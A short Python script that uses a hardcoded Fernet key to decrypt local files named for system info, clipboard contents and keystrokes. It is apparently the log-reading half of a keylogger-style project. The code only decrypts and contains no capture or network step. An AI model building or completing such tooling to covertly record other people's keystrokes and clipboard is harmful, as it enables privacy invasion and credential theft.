from cryptography.fernet import Fernet

key = "yhz2oFRG_8dASJVORjLr9UyMSsmmA0FQxvPNOFksPC0="
system_info_e = "e_system_info.txt"
clipboard_info_e = "e_clipboard.txt"
key_info_e = "e_keys_info.txt"

encrypted_files = [
    system_info_e,
    clipboard_info_e,
    key_info_e
]

count = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(decrypted)
    count += 1
